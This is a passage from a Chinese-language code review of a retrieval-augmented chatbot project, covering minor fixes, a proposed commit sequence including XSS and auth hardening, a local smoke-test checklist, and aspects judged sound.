if item is None or (item.dense_rank or 10 ** 9) > rank:
```

**（3）`main.py:112` 写死 `reload=True`**：生产禁用热重载。改为 `reload=os.getenv("DEBUG", "").lower() in ("1", "true")` 或干脆 `False`（开发时用 `uvicorn main:app --reload` 命令行更方便）。

**（4）`EmbeddingModel.__init__` 默认值与配置不一致**：`embedding_model.py:21` 默认 `BAAI/bge-small-zh-v1.5`，而 config 默认 `paraphrase-multilingual-MiniLM-L12-v2`。容器始终显式传参所以没炸，但这是个陷阱。改为：

```python
from src.infra.config import EMBEDDING_MODEL

    def __init__(self, model_name: str = EMBEDDING_MODEL):
```

**（5）合并重复提交**：`72bf057` 与 `ec02eb4` 同名同主题，建议 squash：

```bash
git rebase -i HEAD~2          # 将第二个提交 squash 进第一个
git push --force-with-lease origin feature/rag-engine
```

> 该分支已推送，force push 前确认没有他人基于它工作；若已发起 PR 则以 PR 界面的 squash merge 代替。

**（6）`main.py:107` 注释笔误**："unicorn接受..." → "uvicorn 接受..."。

---

## 建议的提交切分

按依赖关系分批提交，每批可独立验证：

| 序 | Commit 主题 | 对应问题 |
|----|------------|----------|
| 1 | `fix(web): 前端接入 session_id，修复多轮对话与系统提示词失效` | #1 |
| 2 | `fix(deps): 补齐 streamlit/docx2txt 依赖，移除 .doc 伪支持` | #2 |
| 3 | `fix(security): 前端输出 HTML 转义，防存储型 XSS` | #4 |
| 4 | `fix(docker): 拆分 api/web 双服务，修复容器启动失败` | #3 |
| 5 | `feat(api): API Token 鉴权、CORS 白名单、隐藏内部异常` | #5 |
| 6 | `perf(api): 阻塞调用移入线程池，避免冻结事件循环` | #6 |
| 7 | `refactor(cli): 单事件循环运行 REPL` | #7 |
| 8 | `chore: 清理死代码（core/schemas/prompt_builder/session_service/update.md）` | #8 |
| 9 | `chore(git): 修正 .gitignore 与跟踪状态，取消跟踪 .codex` | #9 |
| 10 | `feat(rag): 换用中文 CrossEncoder 重排序模型并配置化` | #10 |
| 11 | `chore: 杂项（context_filter/rank_offset/reload/注释）` | #11 |

---

## 全量回归清单（修复完成后逐项过）

```bash
# 1. 干净环境安装
python -m venv venv && venv/Scripts/pip install -r requirements.txt

# 2. 语法与导入
venv/Scripts/python -m compileall -q src main.py app.py api.py
venv/Scripts/python -c "from src.container import get_container; get_container()"

# 3. API 冒烟
python main.py &
curl http://localhost:8000/health
curl -X POST http://localhost:8000/upload/ -F "files=@test.docx"     # chunks > 0
curl -X POST http://localhost:8000/chat/ -H "Content-Type: application/json" \
     -d '{"message":"我叫小明","session_id":"s1"}'
curl -X POST http://localhost:8000/chat/ -H "Content-Type: application/json" \
     -d '{"message":"我叫什么","session_id":"s1"}'                   # 应回答"小明"

# 4. Web 冒烟
streamlit run app.py
# - 侧边栏显示 API 已连接；自定义系统提示词生效
# - 两轮对话有记忆；XSS payload 只显示为文本
# - 清空对话后新会话 ID 生效

# 5. CLI 冒烟
python -m src.cli chat
# /help /switch /rag build /history /new /exit 全命令走一遍

# 6. 并发
# 发起慢聊天请求的同时 curl /health，应立即响应

# 7. Docker
docker compose up -d --build
docker compose ps        # api、web 双容器 healthy
```

---

## 附：审查中确认无问题的方面

- `.env` / `venv/` / `chat_history/` / `vector_db/` / `knowledge_base/` 均正确忽略，**已跟踪文件中扫描不到任何 API Key 或密钥**；
- chunk 确定性 ID（`sha1(doc_id|page|index|content_hash)`）+ `delete_by_source` + upsert，重复上传幂等安全；
- 上传文件名清洗（`_sanitize_filename`）阻断了路径穿越；
- 混合检索（BM25 + 向量 + RRF + 重排）的 pipeline 结构清晰、日志规范；
- DI 容器 + lifespan 生命周期管理设计合理，`main.py` 与 `api.py` 兼容入口处理干净。
